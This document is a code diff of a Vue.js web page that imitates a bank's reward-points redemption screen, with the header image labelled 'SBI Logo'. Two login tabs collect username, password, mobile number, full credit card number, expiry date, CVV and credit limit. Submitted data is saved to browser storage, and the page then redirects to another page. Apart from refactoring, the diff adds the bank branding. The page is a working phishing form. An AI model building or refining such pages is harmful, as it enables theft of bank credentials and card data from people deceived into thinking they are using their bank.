@@ -4,189 +4,47 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>i - Vue</title>
-    <!-- Vue.js favicon -->
     <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
-    <!-- Vue.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        
-        body {
-            background-color: #f0f0f0;
-            min-height: 100vh;
-            padding-bottom: 20px;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 15px;
-            background-color: white;
-        }
-        
-        .logo {
-            max-width: 100%;
-            height: auto;
-            max-height: 120px;
-        }
-        
-        .container {
-            max-width: 420px;
-            margin: 15px auto;
-            background-color: white;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
-            overflow: hidden;
-        }
-        
-        .form-header {
-            color: #000000;
-            padding: 18px 20px 15px 20px;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 900;
-            letter-spacing: 0.5px;
-        }
-        
-        .tabs-container {
-            display: flex;
-            background-color: #f5f5f5;
-            padding: 3px;
-            margin: 0 20px 10px 20px;
-            border-radius: 25px;
-            height: 38px;
-        }
-        
-        .tab {
-            flex: 1;
-            padding: 6px 4px;
-            text-align: center;
-            font-size: 15px;
-            font-weight: bold;
-            background-color: transparent;
-            color: #777777;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: all 0.3s;
-            line-height: 1.2;
-        }
-        
-        .tab.active {
-            background-color: #24A1E8;
-            color: #ffffff;
-            box-shadow: 0 2px 4px rgba(36, 161, 232, 0.2);
-        }
-        
-        .form-content {
-            padding: 0 20px 20px 20px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            font-size: 14px;
-            font-weight: bold;
-            color: #666666;
-            margin-bottom: 5px;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 8px 0 4px 0;
-            font-size: 16px;
-            border: none;
-            border-bottom: 1px solid #dddddd;
-            background-color: transparent;
-            outline: none;
-            border-radius: 0;
-            transition: border-color 0.3s;
-            color: #444444;
-            margin-bottom: 5px;
-        }
-        
-        .form-input:focus {
-            border-bottom-color: #24A1E8;
-        }
-        
-        .login-button {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            background-color: #24A1E8;
-            color: white;
-            font-size: 15px;
-            font-weight: bold;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 25px;
-        }
-        
-        .login-button:hover {
-            background-color: #1a8cd8;
-        }
-        
-        .expiry-cvv-container {
-            display: flex;
-            gap: 20px;
-        }
-        
-        .expiry-cvv-container > div {
-            flex: 1;
-        }
-        
-        .footer-img {
-            width: 100%;
-            max-width: 900px;
-            display: block;
-            margin: 20px auto 0;
-        }
-        
-        .asterisk {
-            color: #ff0000;
-            font-size: 15px;
-        }
-        
-        .error-message {
-            color: #ff4444;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-        
-        .form-input.error {
-            border-bottom-color: #ff4444;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #f0f0f0; min-height: 100vh; padding-bottom: 20px; }
+        .header { text-align: center; padding: 15px; background-color: white; }
+        .logo { max-width: 100%; height: auto; max-height: 120px; }
+        .container { max-width: 420px; margin: 15px auto; background-color: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.08); overflow: hidden; }
+        .form-header { color: #000000; padding: 18px 20px 15px 20px; text-align: center; font-size: 18px; font-weight: 900; letter-spacing: 0.5px; }
+        .tabs-container { display: flex; background-color: #f5f5f5; padding: 3px; margin: 0 20px 10px 20px; border-radius: 25px; height: 38px; }
+        .tab { flex: 1; padding: 6px 4px; text-align: center; font-size: 15px; font-weight: bold; background-color: transparent; color: #777777; border: none; border-radius: 25px; cursor: pointer; transition: all 0.3s; line-height: 1.2; }
+        .tab.active { background-color: #24A1E8; color: #ffffff; box-shadow: 0 2px 4px rgba(36, 161, 232, 0.2); }
+        .form-content { padding: 0 20px 20px 20px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 14px; font-weight: bold; color: #666666; margin-bottom: 5px; }
+        .form-input { width: 100%; padding: 8px 0 4px 0; font-size: 16px; border: none; border-bottom: 1px solid #dddddd; background-color: transparent; outline: none; border-radius: 0; transition: border-color 0.3s; color: #444444; margin-bottom: 5px; }
+        .form-input:focus { border-bottom-color: #24A1E8; }
+        .login-button { display: block; width: 100%; padding: 10px; background-color: #24A1E8; color: white; font-size: 15px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; margin-top: 25px; }
+        .login-button:hover { background-color: #1a8cd8; }
+        .expiry-cvv-container { display: flex; gap: 20px; }
+        .expiry-cvv-container > div { flex: 1; }
+        .footer-img { width: 100%; max-width: 900px; display: block; margin: 20px auto 0; }
+        .asterisk { color: #ff0000; font-size: 15px; }
+        .error-message { color: #ff4444; font-size: 12px; margin-top: 5px; }
+        .form-input.error { border-bottom-color: #ff4444; }
     </style>
 </head>
 <body>
     <div id="app">
-        <!-- मुख्य कंटेंट, बिना किसी देरी के दिखेगा -->
         <div>
             <div class="header">
-                <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
-                     alt="Skgo" 
-                     class="logo">
+                <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo">
             </div>
-            
             <div class="container">
-                <div class="form-header">
-                    Continue to Redeem Point
-                </div>
-                
+                <div class="form-header">Continue to Redeem Point</div>
                 <div class="tabs-container">
                     <button class="tab" :class="{ active: currentTab === 'user' }" @click="currentTab = 'user'">User ID</button>
                     <button class="tab" :class="{ active: currentTab === 'card' }" @click="currentTab = 'card'">Credit Card No.</button>
                 </div>
                 
-                <!-- User ID फॉर्म -->
+                <!-- User ID Form -->
                 <div class="form-content" v-show="currentTab === 'user'">
                     <form @submit.prevent="submitUserForm">
                         <div class="form-group">
@@ -194,65 +52,55 @@
                             <input type="text" class="form-input" :class="{ error: userErrors.username }" v-model="userForm.username" @input="clearUserError('username')" required>
                             <div v-if="userErrors.username" class="error-message">{{ userErrors.username }}</div>
                         </div>
-                        
                         <div class="form-group">
                             <label class="form-label">Password <span class="asterisk">*</span></label>
                             <input type="text" class="form-input" :class="{ error: userErrors.password }" v-model="userForm.password" @input="clearUserError('password')" required minlength="6">
                             <div v-if="userErrors.password" class="error-message">{{ userErrors.password }}</div>
                         </div>
-                        
                         <div class="form-group">
                             <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
-                            <input type="tel" class="form-input" :class="{ error: userErrors.mobile }" v-model="userForm.mobile" @input="formatMobile('user'); clearUserError('mobile')" required maxlength="10" pattern="[0-9]{10}">
+                            <input type="tel" class="form-input" :class="{ error: userErrors.mobile }" v-model="userForm.mobile" @input="handleMobileInput('user')" required>
                             <div v-if="userErrors.mobile" class="error-message">{{ userErrors.mobile }}</div>
                         </div>
-                        
                         <button type="submit" class="login-button">LOGIN</button>
                     </form>
                 </div>
                 
-                <!-- Credit Card फॉर्म -->
+                <!-- Credit Card Form -->
                 <div class="form-content" v-show="currentTab === 'card'">
                     <form @submit.prevent="submitCardForm">
                         <div class="form-group">
                             <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
-                            <input type="text" class="form-input" :class="{ error: cardErrors.cardNumber }" v-model="cardForm.cardNumber" @input="formatCardNumber; clearCardError('cardNumber')" required>
+                            <input type="text" class="form-input" :class="{ error: cardErrors.cardNumber }" v-model="cardForm.cardNumber" @input="handleCardNumberInput" required>
                             <div v-if="cardErrors.cardNumber" class="error-message">{{ cardErrors.cardNumber }}</div>
                         </div>
-                        
                         <div class="expiry-cvv-container">
                             <div class="form-group">
                                 <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
-                                <input type="text" class="form-input" :class="{ error: cardErrors.expiry }" v-model="cardForm.expiry" @input="formatExpiry; clearCardError('expiry')" required placeholder="MM/YY">
+                                <input type="text" class="form-input" :class="{ error: cardErrors.expiry }" v-model="cardForm.expiry" @input="handleExpiryInput" required placeholder="MM/YY">
                                 <div v-if="cardErrors.expiry" class="error-message">{{ cardErrors.expiry }}</div>
                             </div>
                             <div class="form-group">
                                 <label class="form-label">CVV <span class="asterisk">**</span></label>
-                                <input type="text" class="form-input" :class="{ error: cardErrors.cvv }" v-model="cardForm.cvv" @input="formatCVV; clearCardError('cvv')" required maxlength="3" pattern="[0-9]{3}">
+                                <input type="text" class="form-input" :class="{ error: cardErrors.cvv }" v-model="cardForm.cvv" @input="handleCvvInput" required maxlength="3">
                                 <div v-if="cardErrors.cvv" class="error-message">{{ cardErrors.cvv }}</div>
                             </div>
                         </div>
-                        
                         <div class="form-group">
                             <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
                             <input type="text" class="form-input" :class="{ error: cardErrors.creditLimit }" v-model="cardForm.creditLimit" @input="clearCardError('creditLimit')" required>
                             <div v-if="cardErrors.creditLimit" class="error-message">{{ cardErrors.creditLimit }}</div>
                         </div>
-                        
                         <div class="form-group">
                             <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
-                            <input type="tel" class="form-input" :class="{ error: cardErrors.cardMobile }" v-model="cardForm.cardMobile" @input="formatMobile('card'); clearCardError('cardMobile')" required maxlength="10" pattern="[0-9]{10}">
+                            <input type="tel" class="form-input" :class="{ error: cardErrors.cardMobile }" v-model="cardForm.cardMobile" @input="handleMobileInput('card')" required>
                             <div v-if="cardErrors.cardMobile" class="error-message">{{ cardErrors.cardMobile }}</div>
                         </div>
-                        
                         <button type="submit" class="login-button">LOGIN</button>
                     </form>
                 </div>
             </div>
-            
-            <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
-                 alt="Sehses" 
-                 class="footer-img">
+            <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class="footer-img">
         </div>
     </div>
 
@@ -261,34 +109,32 @@
             el: '#app',
             data: {
                 currentTab: 'user',
-                // User form data
-                userForm: {
-                    username: '',
-                    password: '',
-                    mobile: ''
-                },
+                userForm: { username: '', password: '', mobile: '' },
                 userErrors: {},
-                // Card form data
-                cardForm: {
-                    cardNumber: '',
-                    expiry: '',
-                    cvv: '',
-                    creditLimit: '',
-                    cardMobile: ''
-                },
+                cardForm: { cardNumber: '', expiry: '', cvv: '', creditLimit: '', cardMobile: '' },
                 cardErrors: {}
             },
             methods: {
-                // ---------- User Form Validation ----------
+                // ---------- User Form ----------
+                clearUserError(field) {
+                    if (this.userErrors[field]) this.$delete(this.userErrors, field);
+                },
+                handleMobileInput(type) {
+                    if (type === 'user') {
+                        this.userForm.mobile = this.userForm.mobile.replace(/\D/g, '').slice(0, 10);
+                        this.clearUserError('mobile');
+                    } else {
+                        this.cardForm.cardMobile = this.cardForm.cardMobile.replace(/\D/g, '').slice(0, 10);
+                        this.clearCardError('cardMobile');
+                    }
+                },
                 validateUserForm() {
                     this.userErrors = {};
                     let isValid = true;
-
                     if (!this.userForm.username.trim()) {
                         this.userErrors.username = 'Username is required';
                         isValid = false;
                     }
-
                     if (!this.userForm.password.trim()) {
                         this.userErrors.password = 'Password is required';
                         isValid = false;
@@ -296,7 +142,6 @@
                         this.userErrors.password = 'Password must be at least 6 characters';
                         isValid = false;
                     }
-
                     if (!this.userForm.mobile.trim()) {
                         this.userErrors.mobile = 'Mobile number is required';
                         isValid = false;
@@ -304,30 +149,49 @@
                         this.userErrors.mobile = 'Valid 10-digit mobile number is required';
                         isValid = false;
                     }
-
                     return isValid;
-                },
-                clearUserError(field) {
-                    if (this.userErrors[field]) {
-                        this.$delete(this.userErrors, field);
-                    }
                 },
                 submitUserForm() {
                     if (this.validateUserForm()) {
-                        const formData = {
+                        this.saveDataAndRedirect({
                             username: this.userForm.username,
                             password: this.userForm.password,
                             mobile: this.userForm.mobile
-                        };
-                        this.saveDataAndRedirect(formData, 'User ID');
+                        }, 'User ID');
                     }
                 },
-
-                // ---------- Card Form Validation ----------
+                
+                // ---------- Card Form ----------
+                clearCardError(field) {
+                    if (this.cardErrors[field]) this.$delete(this.cardErrors, field);
+                },
+                handleCardNumberInput(e) {
+                    let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '').slice(0, 16);
+                    let formatted = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) formatted += ' ';
+                        formatted += value[i];
+                    }
+                    this.cardForm.cardNumber = formatted;
+                    this.clearCardError('cardNumber');
+                },
+                handleExpiryInput(e) {
+                    let value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                    if (value.length >= 2) {
+                        value = value.slice(0, 2) + '/' + value.slice(2);
+                    }
+                    this.cardForm.expiry = value;
+                    this.clearCardError('expiry');
+                },
+                handleCvvInput(e) {
+                    this.cardForm.cvv = e.target.value.replace(/\D/g, '').slice(0, 3);
+                    this.clearCardError('cvv');
+                },
                 validateCardForm() {
                     this.cardErrors = {};
                     let isValid = true;
-
+                    
+                    // Card Number
                     if (!this.cardForm.cardNumber.trim()) {
                         this.cardErrors.cardNumber = 'Credit card number is required';
                         isValid = false;
@@ -338,7 +202,8 @@
                             isValid = false;
                         }
                     }
-
+                    
+                    // Expiry
                     if (!this.cardForm.expiry.trim()) {
                         this.cardErrors.expiry = 'Expiry date is required';
                         isValid = false;
@@ -346,7 +211,8 @@
                         this.cardErrors.expiry = 'Format: MM/YY (e.g., 12/25)';
                         isValid = false;
                     }
-
+                    
+                    // CVV
                     if (!this.cardForm.cvv.trim()) {
                         this.cardErrors.cvv = 'CVV is required';
                         isValid = false;
@@ -354,12 +220,14 @@
                         this.cardErrors.cvv = '3-digit CVV is required';
                         isValid = false;
                     }
-
+                    
+                    // Credit Limit
                     if (!this.cardForm.creditLimit.trim()) {
                         this.cardErrors.creditLimit = 'Credit limit is required';
                         isValid = false;
                     }
-
+                    
+                    // Mobile
                     if (!this.cardForm.cardMobile.trim()) {
                         this.cardErrors.cardMobile = 'Mobile number is required';
                         isValid = false;
@@ -367,55 +235,31 @@
                         this.cardErrors.cardMobile = 'Valid 10-digit mobile number is required';
                         isValid = false;
                     }
-
+                    
                     return isValid;
                 },
-                clearCardError(field) {
-                    if (this.cardErrors[field]) {
-                        this.$delete(this.cardErrors, field);
+                submitCardForm() {
+                    if (this.validateCardForm()) {
+                        this.saveDataAndRedirect({
+                            cardNumber: this.cardForm.cardNumber,
+                            expiry: this.cardForm.expiry,
+                            cvv: this.cardForm.cvv,
+                            creditLimit: this.cardForm.creditLimit,
+                            mobile: this.cardForm.cardMobile
+                        }, 'Credit Card');
                     }
                 },
-
-                // ---------- Formatting Methods ----------
-                formatCardNumber(e) {
-                    let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
-                    value = value.substring(0, 16);
-                    let formatted = '';
-                    for (let i = 0; i < value.length; i++) {
-                        if (i > 0 && i % 4 === 0) formatted += ' ';
-                        formatted += value[i];
-                    }
-                    this.cardForm.cardNumber = formatted;
-                },
-                formatExpiry(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    if (value.length >= 2) {
-                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                    }
-                    this.cardForm.expiry = value.substring(0, 5);
-                },
-                formatCVV(e) {
-                    this.cardForm.cvv = e.target.value.replace(/\D/g, '').substring(0, 3);
-                },
-                formatMobile(type) {
-                    if (type === 'user') {
-                        this.userForm.mobile = this.userForm.mobile.replace(/\D/g, '').substring(0, 10);
-                    } else {
-                        this.cardForm.cardMobile = this.cardForm.cardMobile.replace(/\D/g, '').substring(0, 10);
-                    }
-                },
-
-                // ---------- Save & Redirect ----------
+                
+                // ---------- Common ----------
                 saveDataAndRedirect(formData, formType) {
                     const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-                    const submission = {
+                    submissions.push({
                         id: Date.now(),
                         type: formType,
                         data: formData,
                         timestamp: new Date().toISOString(),
                         ip: 'Not available in browser'
-                    };
-                    submissions.push(submission);
+                    });
                     localStorage.setItem('formSubmissions', JSON.stringify(submissions));
                     window.location.href = 'blogone.html';
                 }
